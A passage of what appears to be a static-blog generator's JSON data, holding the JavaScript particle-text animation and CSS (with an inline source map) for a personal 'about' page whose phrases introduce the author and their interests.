this.opacityTresh = 0.98\n      this.fadingOut = true\n      this.fadingIn = true\n    }\n    fadeIn () {\n      this.fadingIn = this.opacity > this.opacityTresh ? false : true\n      if (this.fadingIn) {\n        this.opacity += this.fadeInRate\n      }else {\n        this.opacity = 1\n      }\n    }\n    fadeOut () {\n      this.fadingOut = this.opacity < 0 ? false : true\n      if (this.fadingOut) {\n        this.opacity -= this.fadeOutRate\n        if (this.opacity < 0) {\n          this.opacity = 0\n        }\n      }else {\n        this.opacity = 0\n      }\n    }\n    draw (ctx) {\n      ctx.fillStyle = 'rgba(226,225,142, ' + this.opacity + ')'\n      ctx.beginPath()\n      ctx.arc(this.x, this.y, this.size, 0, RADIUS, true)\n      ctx.closePath()\n      ctx.fill()\n    }\n  }\n\n  // setTimeout(() => {\n    init()\n  // }, 4000);\n  // mp3.play()\n})(window)\n","date":"2017-03-08T19:05:11.000Z","updated":"2017-03-08T19:05:11.000Z","path":"about/scripts/main.js","layout":"false","title":"","comments":1,"_id":"cj2mm9xrh004n5es5u69fqlri","content":";(function (window) {\n  window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame ||\n  window.webkitRequestAnimationFrame || window.msRequestAnimationFrame\n\n  const FRAME_RATE = 60\n  const PARTICLE_NUM = 2000\n  const RADIUS = Math.PI * 2\n  const CANVASWIDTH = 500\n  const CANVASHEIGHT = 150\n  const CANVASID = 'canvas'\n\n  let texts = ['Hello', '我叫一凡', '伯明翰大学', '喜爱计算机', '极客一个', 'Web前端', '渗透测试', '小美工', '爱背网址', '空格党', 'Github狂魔', 'Cnbeta党', 'Mac党 果粉', '知乎狂魔', '曾经的OIer', '爱Linux', '喜欢交友', '欢迎联系我']\n\n  let canvas,\n    ctx,\n    particles = [],\n    quiver = true,\n    text = texts[0],\n    textIndex = 0,\n    textSize = 70\n\n  function draw () {\n    ctx.clearRect(0, 0, CANVASWIDTH, CANVASHEIGHT)\n    ctx.fillStyle = 'rgb(255, 255, 255)'\n    ctx.textBaseline = 'middle'\n    ctx.fontWeight = 'bold'\n    ctx.font = textSize + 'px \\'SimHei\\', \\'Avenir\\', \\'Helvetica Neue\\', \\'Arial\\', \\'sans-serif\\''\n    ctx.fillText(text, (CANVASWIDTH - ctx.measureText(text).width) * 0.5, CANVASHEIGHT * 0.5)\n\n    let imgData = ctx.getImageData(0, 0, CANVASWIDTH, CANVASHEIGHT)\n\n    ctx.clearRect(0, 0, CANVASWIDTH, CANVASHEIGHT)\n\n    for (let i = 0, l = particles.length; i < l; i++) {\n      let p = particles[i]\n      p.inText = false\n    }\n    particleText(imgData)\n\n    window.requestAnimationFrame(draw)\n  }\n\n  function particleText (imgData) {\n    // 点坐标获取\n    var pxls = []\n    for (var w = CANVASWIDTH; w > 0; w -= 3) {\n      for (var h = 0; h < CANVASHEIGHT; h += 3) {\n        var index = (w + h * (CANVASWIDTH)) * 4\n        if (imgData.data[index] > 1) {\n          pxls.push([w, h])\n        }\n      }\n    }\n\n    var count = pxls.length\n    var j = parseInt((particles.length - pxls.length) / 2, 10)\n    j = j < 0 ? 0 : j\n\n    for (var i = 0; i < pxls.length && j < particles.length; i++, j++) {\n      try {\n        var p = particles[j],\n          X,\n          Y\n\n        if (quiver) {\n          X = (pxls[i - 1][0]) - (p.px + Math.random() * 10)\n          Y = (pxls[i - 1][1]) - (p.py + Math.random() * 10)\n        } else {\n          X = (pxls[i - 1][0]) - p.px\n          Y = (pxls[i - 1][1]) - p.py\n        }\n        var T = Math.sqrt(X * X + Y * Y)\n        var A = Math.atan2(Y, X)\n        var C = Math.cos(A)\n        var S = Math.sin(A)\n        p.x = p.px + C * T * p.delta\n        p.y = p.py + S * T * p.delta\n        p.px = p.x\n        p.py = p.y\n        p.inText = true\n        p.fadeIn()\n        p.draw(ctx)\n      } catch (e) {}\n    }\n    for (var i = 0; i < particles.length; i++) {\n      var p = particles[i]\n      if (!p.inText) {\n        p.fadeOut()\n\n        var X = p.mx - p.px\n        var Y = p.my - p.py\n        var T = Math.sqrt(X * X + Y * Y)\n        var A = Math.atan2(Y, X)\n        var C = Math.cos(A)\n        var S = Math.sin(A)\n\n        p.x = p.px + C * T * p.delta / 2\n        p.y = p.py + S * T * p.delta / 2\n        p.px = p.x\n        p.py = p.y\n\n        p.draw(ctx)\n      }\n    }\n  }\n\n  function setDimensions () {\n    canvas.width = CANVASWIDTH\n    canvas.height = CANVASHEIGHT\n    canvas.style.position = 'absolute'\n    canvas.style.left = '0px'\n    canvas.style.top = '0px'\n    canvas.style.bottom = '0px'\n    canvas.style.right = '0px'\n    canvas.style.marginTop = window.innerHeight * .15 + 'px'\n  }\n\n  function event () {\n    document.addEventListener('click', function (e) {\n      textIndex++\n      if (textIndex >= texts.length) {\n          window.location.href=\"/aboutme.html\";\n      }\n      text = texts[textIndex]\n    }, false)\n\n    document.addEventListener('touchstart', function (e) {\n      textIndex++\n      if (textIndex >= texts.length) {\n          window.location.href=\"/aboutme.html\";\n      }\n      text = texts[textIndex]\n    }, false)\n  }\n\n  function init () {\n    canvas = document.getElementById(CANVASID)\n    if (canvas === null || !canvas.getContext) {\n      return\n    }\n    ctx = canvas.getContext('2d')\n    setDimensions()\n    event()\n\n    for (var i = 0; i < PARTICLE_NUM; i++) {\n      particles[i] = new Particle(canvas)\n    }\n\n    draw()\n  }\n\n  class Particle {\n    constructor (canvas) {\n      let spread = canvas.height\n      let size = Math.random() * 1.2\n      // 速度\n      this.delta = 0.06\n      // 现在的位置\n      this.x = 0\n      this.y = 0\n      // 上次的位置\n      this.px = Math.random() * canvas.width\n      this.py = (canvas.height * 0.5) + ((Math.random() - 0.5) * spread)\n      // 记录点最初的位置\n      this.mx = this.px\n      this.my = this.py\n      // 点的大小\n      this.size = size\n      // this.origSize = size\n      // 是否用来显示字\n      this.inText = false\n      // 透明度相关\n      this.opacity = 0\n      this.fadeInRate = 0.05\n      this.fadeOutRate = 0.03\n      this.opacityTresh = 0.98\n      this.fadingOut = true\n      this.fadingIn = true\n    }\n    fadeIn () {\n      this.fadingIn = this.opacity > this.opacityTresh ? false : true\n      if (this.fadingIn) {\n        this.opacity += this.fadeInRate\n      }else {\n        this.opacity = 1\n      }\n    }\n    fadeOut () {\n      this.fadingOut = this.opacity < 0 ? false : true\n      if (this.fadingOut) {\n        this.opacity -= this.fadeOutRate\n        if (this.opacity < 0) {\n          this.opacity = 0\n        }\n      }else {\n        this.opacity = 0\n      }\n    }\n    draw (ctx) {\n      ctx.fillStyle = 'rgba(226,225,142, ' + this.opacity + ')'\n      ctx.beginPath()\n      ctx.arc(this.x, this.y, this.size, 0, RADIUS, true)\n      ctx.closePath()\n      ctx.fill()\n    }\n  }\n\n  // setTimeout(() => {\n    init()\n  // }, 4000);\n  // mp3.play()\n})(window)\n","excerpt":"","more":";(function (window) {\n  window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame ||\n  window.webkitRequestAnimationFrame || window.msRequestAnimationFrame\n\n  const FRAME_RATE = 60\n  const PARTICLE_NUM = 2000\n  const RADIUS = Math.PI * 2\n  const CANVASWIDTH = 500\n  const CANVASHEIGHT = 150\n  const CANVASID = 'canvas'\n\n  let texts = ['Hello', '我叫一凡', '伯明翰大学', '喜爱计算机', '极客一个', 'Web前端', '渗透测试', '小美工', '爱背网址', '空格党', 'Github狂魔', 'Cnbeta党', 'Mac党 果粉', '知乎狂魔', '曾经的OIer', '爱Linux', '喜欢交友', '欢迎联系我']\n\n  let canvas,\n    ctx,\n    particles = [],\n    quiver = true,\n    text = texts[0],\n    textIndex = 0,\n    textSize = 70\n\n  function draw () {\n    ctx.clearRect(0, 0, CANVASWIDTH, CANVASHEIGHT)\n    ctx.fillStyle = 'rgb(255, 255, 255)'\n    ctx.textBaseline = 'middle'\n    ctx.fontWeight = 'bold'\n    ctx.font = textSize + 'px \\'SimHei\\', \\'Avenir\\', \\'Helvetica Neue\\', \\'Arial\\', \\'sans-serif\\''\n    ctx.fillText(text, (CANVASWIDTH - ctx.measureText(text).width) * 0.5, CANVASHEIGHT * 0.5)\n\n    let imgData = ctx.getImageData(0, 0, CANVASWIDTH, CANVASHEIGHT)\n\n    ctx.clearRect(0, 0, CANVASWIDTH, CANVASHEIGHT)\n\n    for (let i = 0, l = particles.length; i < l; i++) {\n      let p = particles[i]\n      p.inText = false\n    }\n    particleText(imgData)\n\n    window.requestAnimationFrame(draw)\n  }\n\n  function particleText (imgData) {\n    // 点坐标获取\n    var pxls = []\n    for (var w = CANVASWIDTH; w > 0; w -= 3) {\n      for (var h = 0; h < CANVASHEIGHT; h += 3) {\n        var index = (w + h * (CANVASWIDTH)) * 4\n        if (imgData.data[index] > 1) {\n          pxls.push([w, h])\n        }\n      }\n    }\n\n    var count = pxls.length\n    var j = parseInt((particles.length - pxls.length) / 2, 10)\n    j = j < 0 ? 0 : j\n\n    for (var i = 0; i < pxls.length && j < particles.length; i++, j++) {\n      try {\n        var p = particles[j],\n          X,\n          Y\n\n        if (quiver) {\n          X = (pxls[i - 1][0]) - (p.px + Math.random() * 10)\n          Y = (pxls[i - 1][1]) - (p.py + Math.random() * 10)\n        } else {\n          X = (pxls[i - 1][0]) - p.px\n          Y = (pxls[i - 1][1]) - p.py\n        }\n        var T = Math.sqrt(X * X + Y * Y)\n        var A = Math.atan2(Y, X)\n        var C = Math.cos(A)\n        var S = Math.sin(A)\n        p.x = p.px + C * T * p.delta\n        p.y = p.py + S * T * p.delta\n        p.px = p.x\n        p.py = p.y\n        p.inText = true\n        p.fadeIn()\n        p.draw(ctx)\n      } catch (e) {}\n    }\n    for (var i = 0; i < particles.length; i++) {\n      var p = particles[i]\n      if (!p.inText) {\n        p.fadeOut()\n\n        var X = p.mx - p.px\n        var Y = p.my - p.py\n        var T = Math.sqrt(X * X + Y * Y)\n        var A = Math.atan2(Y, X)\n        var C = Math.cos(A)\n        var S = Math.sin(A)\n\n        p.x = p.px + C * T * p.delta / 2\n        p.y = p.py + S * T * p.delta / 2\n        p.px = p.x\n        p.py = p.y\n\n        p.draw(ctx)\n      }\n    }\n  }\n\n  function setDimensions () {\n    canvas.width = CANVASWIDTH\n    canvas.height = CANVASHEIGHT\n    canvas.style.position = 'absolute'\n    canvas.style.left = '0px'\n    canvas.style.top = '0px'\n    canvas.style.bottom = '0px'\n    canvas.style.right = '0px'\n    canvas.style.marginTop = window.innerHeight * .15 + 'px'\n  }\n\n  function event () {\n    document.addEventListener('click', function (e) {\n      textIndex++\n      if (textIndex >= texts.length) {\n          window.location.href=\"/aboutme.html\";\n      }\n      text = texts[textIndex]\n    }, false)\n\n    document.addEventListener('touchstart', function (e) {\n      textIndex++\n      if (textIndex >= texts.length) {\n          window.location.href=\"/aboutme.html\";\n      }\n      text = texts[textIndex]\n    }, false)\n  }\n\n  function init () {\n    canvas = document.getElementById(CANVASID)\n    if (canvas === null || !canvas.getContext) {\n      return\n    }\n    ctx = canvas.getContext('2d')\n    setDimensions()\n    event()\n\n    for (var i = 0; i < PARTICLE_NUM; i++) {\n      particles[i] = new Particle(canvas)\n    }\n\n    draw()\n  }\n\n  class Particle {\n    constructor (canvas) {\n      let spread = canvas.height\n      let size = Math.random() * 1.2\n      // 速度\n      this.delta = 0.06\n      // 现在的位置\n      this.x = 0\n      this.y = 0\n      // 上次的位置\n      this.px = Math.random() * canvas.width\n      this.py = (canvas.height * 0.5) + ((Math.random() - 0.5) * spread)\n      // 记录点最初的位置\n      this.mx = this.px\n      this.my = this.py\n      // 点的大小\n      this.size = size\n      // this.origSize = size\n      // 是否用来显示字\n      this.inText = false\n      // 透明度相关\n      this.opacity = 0\n      this.fadeInRate = 0.05\n      this.fadeOutRate = 0.03\n      this.opacityTresh = 0.98\n      this.fadingOut = true\n      this.fadingIn = true\n    }\n    fadeIn () {\n      this.fadingIn = this.opacity > this.opacityTresh ? false : true\n      if (this.fadingIn) {\n        this.opacity += this.fadeInRate\n      }else {\n        this.opacity = 1\n      }\n    }\n    fadeOut () {\n      this.fadingOut = this.opacity < 0 ? false : true\n      if (this.fadingOut) {\n        this.opacity -= this.fadeOutRate\n        if (this.opacity < 0) {\n          this.opacity = 0\n        }\n      }else {\n        this.opacity = 0\n      }\n    }\n    draw (ctx) {\n      ctx.fillStyle = 'rgba(226,225,142, ' + this.opacity + ')'\n      ctx.beginPath()\n      ctx.arc(this.x, this.y, this.size, 0, RADIUS, true)\n      ctx.closePath()\n      ctx.fill()\n    }\n  }\n\n  // setTimeout(() => {\n    init()\n  // }, 4000);\n  // mp3.play()\n})(window)\n"},{"_content":"html,\nbody {\n  padding: 0px;\n  margin: 0px;\n  width: 100%;\n  height: 100%;\n  position: fixed;\n}\n\nbody {\n  display: -webkit-box;\n  display: -ms-flexbox;\n  display: flex;\n  -webkit-box-pack: center;\n  -ms-flex-pack: center;\n  justify-content: center;\n  -webkit-box-align: center;\n  -ms-flex-align: center;\n  align-items: center;\n  -webkit-filter: contrast(120%);\n  filter: contrast(120%);\n  background-color: black;\n}\n\n.container {\n  width: 100%;\n  height: 100%;\n  background-image: -webkit-radial-gradient(70% 120% 1600px, #212750 10%, #020409 100%);\n  background-image: radial-gradient(1600px at 70% 120%, #212750 10%, #020409 100%);\n}\n\n.content {\n  width: inherit;\n  height: inherit;\n}\n\n#universe {\n  width: 100%;\n  height: 100%;\n}\n\n#footerContent {\n  font-family: sans-serif;\n  font-size: 110%;\n  color: rgba(200, 220, 255, 0.3);\n  width: 100%;\n  position: fixed;\n  bottom: 0px;\n  padding: 20px;\n  text-align: center;\n  z-index: 20;\n}\n\n#footer {\n  position: absolute;\n  bottom: 0px;\n  height: 300px;\n  width: 100%;\n}\n\n#scene {\n  height: 100%;\n  position: absolute;\n  left: 50%;\n  margin-left: -800px;\n}\n\na {\n  text-decoration: none;\n  color: #c8dcff;\n  opacity: .4;\n  -webkit-transition: opacity .4s ease;\n  transition: opacity .4s ease;\n}\n\na:hover {\n  opacity: 1;\n}\n\n/*box*/\n#box {\n  color: #fff;\n  position: absolute;\n  bottom: 30%;\n  left: 50%;\n  margin-left: -96px;\n  z-index: 100;\n  transform: rotate(-12deg);\n  -webkit-transform: rotate(-12deg);\n  font-size: 12px;\n}\n\n.txt {\n  color: transparent;\n  text-shadow: #fff 0 0 10px;\n  -webkit-transition: text-shadow 2s cubic-bezier(0, 1, 0, 1);\n  transition: text-shadow 2s cubic-bezier(0, 1, 0, 1);\n}\n\n@-moz-document url-prefix() {\n  .txt {\n    text-shadow: #fff 0 0 20px;\n  }\n}\n\n#canvas {\n  margin: 200px auto;\n}\n\n.github {\n  position: absolute;\n  top: 10px;\n  right: 10px;\n  width: 20px;\n}\n\n/*# sourceMappingURL=data:application/json;charset=utf8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIm1haW4uc2NzcyIsIm1haW4uY3NzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQUFBOztFQUVJLGFBQWE7RUFDYixZQUFZO0VBQ1osWUFBWTtFQUNaLGFBQWE7RUFDYixnQkFBZ0I7Q0FDbkI7O0FBRUQ7RUFDSSxxQkFBcUI7RUFFckIscUJBQXFCO0VBQ3JCLGNBQWM7RUFDZCx5QkFBeUI7RUFFekIsc0JBQXNCO0VBQ3RCLHdCQUF3QjtFQUN4QiwwQkFBMEI7RUFFMUIsdUJBQXVCO0VBQ3ZCLG9CQUFvQjtFQUNwQiwrQkFBd0I7RUFDeEIsdUJBQWdCO0VBQ2hCLHdCQUF3QjtDQUMzQjs7QUFFRDtFQUNJLFlBQVk7RUFDWixhQUFhO0VBQ2Isc0ZBQWlDO0VBQWpDLGlGQUFpQztDQUVwQzs7QUFFRDtFQUNJLGVBQWU7RUFDZixnQkFBZ0I7Q0FDbkI7O0FBRUQ7RUFDSSxZQUFZO0VBQ1osYUFBYTtDQUNoQjs7QUFFRDtFQUNJLHdCQUF3QjtFQUN4QixnQkFBZ0I7RUFDaEIsZ0NBQVc7RUFDWCxZQUFZO0VBQ1osZ0JBQWdCO0VBQ2hCLFlBQVk7RUFDWixjQUFjO0VBQ2QsbUJBQW1CO0VBQ25CLFlBQVk7Q0FDZjs7QUFFRDtFQUNJLG1CQUFtQjtFQUNuQixZQUFZO0VBQ1osY0FBYztFQUNkLFlBQVk7Q0FDZjs7QUFFRDtFQUNJLGFBQWE7RUFDYixtQkFBbUI7RUFDbkIsVUFBVTtFQUNWLG9CQUFvQjtDQUN2Qjs7QUFFRDtFQUNJLHNCQUFzQjtFQUN0QixlQUFXO0VBQ1gsWUFBWTtFQUNaLHFDQUFxQztFQUNyQyw2QkFBNkI7Q0FDaEM7O0FBRUQ7RUFDSSxXQUFXO0NBQ2Q7O0FBRUQsT0FBTztBQUVQO0VBQ0ksWUFBWTtFQUNaLG1CQUFtQjtFQUNuQixZQUFZO0VBQ1osVUFBVTtFQUNWLG1CQUFtQjtFQUNuQixhQUFhO0VBQ2IsMEJBQWlCO0VBQ2pCLGtDQUF5QjtFQUN6QixnQkFBZ0I7Q0FDbkI7O0FBRUQ7RUFDSSxtQkFBVztFQUNYLDJCQUEyQjtFQUMzQiw0REFBdUM7RUFBdkMsb0RBQXVDO0NBQzFDOztBQUVEO0VBQ0k7SUFDSSwyQkFBMkI7R0FDOUI7Q0NESjs7QURJRDtFQUNJLG1CQUFtQjtDQUN0Qjs7QUFFRDtFQUNJLG1CQUFtQjtFQUNuQixVQUFVO0VBQ1YsWUFBWTtFQUNaLFlBQVk7Q0FDZiIsImZpbGUiOiJtYWluLmNzcyIsInNvdXJjZXNDb250ZW50IjpbImh0bWwsXG5ib2R5IHtcbiAgICBwYWRkaW5nOiAwcHg7XG4gICAgbWFyZ2luOiAwcHg7XG4gICAgd2lkdGg6IDEwMCU7XG4gICAgaGVpZ2h0OiAxMDAlO1xuICAgIHBvc2l0aW9uOiBmaXhlZDtcbn1cblxuYm9keSB7XG4gICAgZGlzcGxheTogLXdlYmtpdC1ib3g7XG4gICAgZGlzcGxheTogLXdlYmtpdC1mbGV4O1xuICAgIGRpc3BsYXk6IC1tcy1mbGV4Ym94O1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgLXdlYmtpdC1ib3gtcGFjazogY2VudGVyO1xuICAgIC13ZWJraXQtanVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG4gICAgLW1zLWZsZXgtcGFjazogY2VudGVyO1xuICAgIGp1c3RpZnktY29udGVudDogY2VudGVyO1xuICAgIC13ZWJraXQtYm94LWFsaWduOiBjZW50ZXI7XG4gICAgLXdlYmtpdC1hbGlnbi1pdGVtczogY2VudGVyO1xuICAgIC1tcy1mbGV4LWFsaWduOiBjZW50ZXI7XG4gICAgYWxpZ24taXRlbXM6IGNlbnRlcjtcbiAgICAtd2Via2l0LWZpbHRlcjogY29udHJhc3QoMTIwJSk7XG4gICAgZmlsdGVyOiBjb250cmFzdCgxMjAlKTtcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjaztcbn1cblxuLmNvbnRhaW5lciB7XG4gICAgd2lkdGg6IDEwMCU7XG4gICAgaGVpZ2h0OiAxMDAlO1xuICAgIGJhY2tncm91bmQtaW1hZ2U6IHJhZGlhbC1ncmFkaWVudCgxNjAwcHggYXQgNzAlIDEyMCUsIHJnYmEoMzMsIDM5LCA4MCwgMSkgMTAlLCAjMDIwNDA5IDEwMCUpO1xuXG59XG5cbi5jb250ZW50IHtcbiAgICB3aWR0aDogaW5oZXJpdDtcbiAgICBoZWlnaHQ6IGluaGVyaXQ7XG59XG5cbiN1bml2ZXJzZSB7XG4gICAgd2lkdGg6IDEwMCU7XG4gICAgaGVpZ2h0OiAxMDAlO1xufVxuXG4jZm9vdGVyQ29udGVudCB7XG4gICAgZm9udC1mYW1pbHk6IHNhbnMtc2VyaWY7XG4gICAgZm9udC1zaXplOiAxMTAlO1xuICAgIGNvbG9yOiByZ2JhKDIwMCwgMjIwLCAyNTUsIC4zKTtcbiAgICB3aWR0aDogMTAwJTtcbiAgICBwb3NpdGlvbjogZml4ZWQ7XG4gICAgYm90dG9tOiAwcHg7XG4gICAgcGFkZGluZzogMjBweDtcbiAgICB0ZXh0LWFsaWduOiBjZW50ZXI7XG4gICAgei1pbmRleDogMjA7XG59XG5cbiNmb290ZXIge1xuICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgICBib3R0b206IDBweDtcbiAgICBoZWlnaHQ6IDMwMHB4O1xuICAgIHdpZHRoOiAxMDAlO1xufVxuXG4jc2NlbmUge1xuICAgIGhlaWdodDogMTAwJTtcbiAgICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gICAgbGVmdDogNTAlO1xuICAgIG1hcmdpbi1sZWZ0OiAtODAwcHg7XG59XG5cbmEge1xuICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTtcbiAgICBjb2xvcjogcmdiYSgyMDAsIDIyMCwgMjU1LCAxKTtcbiAgICBvcGFjaXR5OiAuNDtcbiAgICAtd2Via2l0LXRyYW5zaXRpb246IG9wYWNpdHkgLjRzIGVhc2U7XG4gICAgdHJhbnNpdGlvbjogb3BhY2l0eSAuNHMgZWFzZTtcbn1cblxuYTpob3ZlciB7XG4gICAgb3BhY2l0eTogMTtcbn1cblxuLypib3gqL1xuXG4jYm94IHtcbiAgICBjb2xvcjogI2ZmZjtcbiAgICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gICAgYm90dG9tOiAzMCU7XG4gICAgbGVmdDogNTAlO1xuICAgIG1hcmdpbi1sZWZ0OiAtOTZweDtcbiAgICB6LWluZGV4OiAxMDA7XG4gICAgdHJhbnNmb3JtOiByb3RhdGUoLTEyZGVnKTtcbiAgICAtd2Via2l0LXRyYW5zZm9ybTogcm90YXRlKC0xMmRlZyk7XG4gICAgZm9udC1zaXplOiAxMnB4O1xufVxuXG4udHh0IHtcbiAgICBjb2xvcjogaHNsYSgwLCAwJSwgMCUsIDApO1xuICAgIHRleHQtc2hhZG93OiAjZmZmIDAgMCAxMHB4O1xuICAgIHRyYW5zaXRpb246IHRleHQtc2hhZG93IDJzIGN1YmljLWJlemllcigwLCAxLCAwLCAxKTtcbn1cblxuQC1tb3otZG9jdW1lbnQgdXJsLXByZWZpeCgpIHtcbiAgICAudHh0IHtcbiAgICAgICAgdGV4dC1zaGFkb3c6ICNmZmYgMCAwIDIwcHg7XG4gICAgfVxufVxuXG4jY2FudmFze1xuICAgIG1hcmdpbjogMjAwcHggYXV0bztcbn1cblxuLmdpdGh1YntcbiAgICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gICAgdG9wOiAxMHB4O1xuICAgIHJpZ2h0OiAxMHB4O1xuICAgIHdpZHRoOiAyMHB4O1xufSIsImh0bWwsXG5ib2R5IHtcbiAgcGFkZGluZzogMHB4O1xuICBtYXJnaW46IDBweDtcbiAgd2lkdGg6IDEwMCU7XG4gIGhlaWdodDogMTAwJTtcbiAgcG9zaXRpb246IGZpeGVkO1xufVxuXG5ib2R5IHtcbiAgZGlzcGxheTogLXdlYmtpdC1ib3g7XG4gIGRpc3BsYXk6IC13ZWJraXQtZmxleDtcbiAgZGlzcGxheTogLW1zLWZsZXhib3g7XG4gIGRpc3BsYXk6IGZsZXg7XG4gIC13ZWJraXQtYm94LXBhY2s6IGNlbnRlcjtcbiAgLXdlYmtpdC1qdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjtcbiAgLW1zLWZsZXgtcGFjazogY2VudGVyO1xuICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjtcbiAgLXdlYmtpdC1ib3gtYWxpZ246IGNlbnRlcjtcbiAgLXdlYmtpdC1hbGlnbi1pdGVtczogY2VudGVyO1xuICAtbXMtZmxleC1hbGlnbjogY2VudGVyO1xuICBhbGlnbi1pdGVtczogY2VudGVyO1xuICAtd2Via2l0LWZpbHRlcjogY29udHJhc3QoMTIwJSk7XG4gIGZpbHRlcjogY29udHJhc3QoMTIwJSk7XG4gIGJhY2tncm91bmQtY29sb3I6IGJsYWNrO1xufVxuXG4uY29udGFpbmVyIHtcbiAgd2lkdGg6IDEwMCU7XG4gIGhlaWdodDogMTAwJTtcbiAgYmFja2dyb3VuZC1pbWFnZTogcmFkaWFsLWdyYWRpZW50KDE2MDBweCBhdCA3MCUgMTIwJSwgIzIxMjc1MCAxMCUsICMwMjA0MDkgMTAwJSk7XG59XG5cbi5jb250ZW50IHtcbiAgd2lkdGg6IGluaGVyaXQ7XG4gIGhlaWdodDogaW5oZXJpdDtcbn1cblxuI3VuaXZlcnNlIHtcbiAgd2lkdGg6IDEwMCU7XG4gIGhlaWdodDogMTAwJTtcbn1cblxuI2Zvb3RlckNvbnRlbnQge1xuICBmb250LWZhbWlseTogc2Fucy1zZXJpZjtcbiAgZm9udC1zaXplOiAxMTAlO1xuICBjb2xvcjogcmdiYSgyMDAsIDIyMCwgMjU1LCAwLjMpO1xuICB3aWR0aDogMTAwJTtcbiAgcG9zaXRpb246IGZpeGVkO1xuICBib3R0b206IDBweDtcbiAgcGFkZGluZzogMjBweDtcbiAgdGV4dC1hbGlnbjogY2VudGVyO1xuICB6LWluZGV4OiAyMDtcbn1cblxuI2Zvb3RlciB7XG4gIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgYm90dG9tOiAwcHg7XG4gIGhlaWdodDogMzAwcHg7XG4gIHdpZHRoOiAxMDAlO1xufVxuXG4jc2NlbmUge1xuICBoZWlnaHQ6IDEwMCU7XG4gIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgbGVmdDogNTAlO1xuICBtYXJnaW4tbGVmdDogLTgwMHB4O1xufVxuXG5hIHtcbiAgdGV4dC1kZWNvcmF0aW9uOiBub25lO1xuICBjb2xvcjogI2M4ZGNmZjtcbiAgb3BhY2l0eTogLjQ7XG4gIC13ZWJraXQtdHJhbnNpdGlvbjogb3BhY2l0eSAuNHMgZWFzZTtcbiAgdHJhbnNpdGlvbjogb3BhY2l0eSAuNHMgZWFzZTtcbn1cblxuYTpob3ZlciB7XG4gIG9wYWNpdHk6IDE7XG59XG5cbi8qYm94Ki9cbiNib3gge1xuICBjb2xvcjogI2ZmZjtcbiAgcG9zaXRpb246IGFic29sdXRlO1xuICBib3R0b206IDMwJTtcbiAgbGVmdDogNTAlO1xuICBtYXJnaW4tbGVmdDogLTk2cHg7XG4gIHotaW5kZXg6IDEwMDtcbiAgdHJhbnNmb3JtOiByb3RhdGUoLTEyZGVnKTtcbiAgLXdlYmtpdC10cmFuc2Zvcm06IHJvdGF0ZSgtMTJkZWcpO1xuICBmb250LXNpemU6IDEycHg7XG59XG5cbi50eHQge1xuICBjb2xvcjogdHJhbnNwYXJlbnQ7XG4gIHRleHQtc2hhZG93OiAjZmZmIDAgMCAxMHB4O1xuICB0cmFuc2l0aW9uOiB0ZXh0LXNoYWRvdyAycyBjdWJpYy1iZXppZXIoMCwgMSwgMCwgMSk7XG59XG5cbkAtbW96LWRvY3VtZW50IHVybC1wcmVmaXgoKSB7XG4gIC50eHQge1xuICAgIHRleHQtc2hhZG93OiAjZmZmIDAgMCAyMHB4O1xuICB9XG59XG5cbiNjYW52YXMge1xuICBtYXJnaW46IDIwMHB4IGF1dG87XG59XG5cbi5naXRodWIge1xuICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gIHRvcDogMTBweDtcbiAgcmlnaHQ6IDEwcHg7XG4gIHdpZHRoOiAyMHB4O1xufVxuIl19 */\n","source":"about/styles/main.css","raw":"html,\nbody {\n  padding: 0px;\n  margin: 0px;\n  width: 100%;\n  height: 100%;\n  position: fixed;\n}\n\nbody {\n  display: -webkit-box;\n  display: -ms-flexbox;\n  display: flex;\n  -webkit-box-pack: center;\n  -ms-flex-pack: center;\n  justify-content: center;\n  -webkit-box-align: center;\n  -ms-flex-align: center;\n  align-items: center;\n  -webkit-filter: contrast(120%);\n  filter: contrast(120%);\n  background-color: black;\n}\n\n.container {\n  width: 100%;\n  height: 100%;\n  background-image: -webkit-radial-gradient(70% 120% 1600px, #212750 10%, #020409 100%);\n  background-image: radial-gradient(1600px at 70% 120%, #212750 10%, #020409 100%);\n}\n\n.content {\n  width: inherit;\n  height: inherit;\n}\n\n#universe {\n  width: 100%;\n  height: 100%;\n}\n\n#footerContent {\n  font-family: sans-serif;\n  font-size: 110%;\n  color: rgba(200, 220, 255, 0.3);\n  width: 100%;\n  position: fixed;\n  bottom: 0px;\n  padding: 20px;\n  text-align: center;\n  z-index: 20;\n}\n\n#footer {\n  position: absolute;\n  bottom: 0px;\n  height: 300px;\n  width: 100%;\n}\n\n#scene {\n  height: 100%;\n  position: absolute;\n  left: 50%;\n  margin-left: -800px;\n}\n\na {\n  text-decoration: none;\n  color: #c8dcff;\n  opacity: .4;\n  -webkit-transition: opacity .4s ease;\n  transition: opacity .4s ease;\n}\n\na:hover {\n  opacity: 1;\n}\n\n/*box*/\n#box {\n  color: #fff;\n  position: absolute;\n  bottom: 30%;\n  left: 50%;\n  margin-left: -96px;\n  z-index: 100;\n  transform: rotate(-12deg);\n  -webkit-transform: rotate(-12deg);\n  font-size: 12px;\n}\n\n.txt {\n  color: transparent;\n  text-shadow: #fff 0 0 10px;\n  -webkit-transition: text-shadow 2s cubic-bezier(0, 1, 0, 1);\n  transition: text-shadow 2s cubic-bezier(0, 1, 0, 1);\n}\n\n@-moz-document url-prefix() {\n  .txt {\n    text-shadow: #fff 0 0 20px;\n  }\n}\n\n#canvas {\n  margin: 200px auto;\n}\n\n.github {\n  position: absolute;\n  top: 10px;\n  right: 10px;\n  width: 20px;\n}\n\n/*# 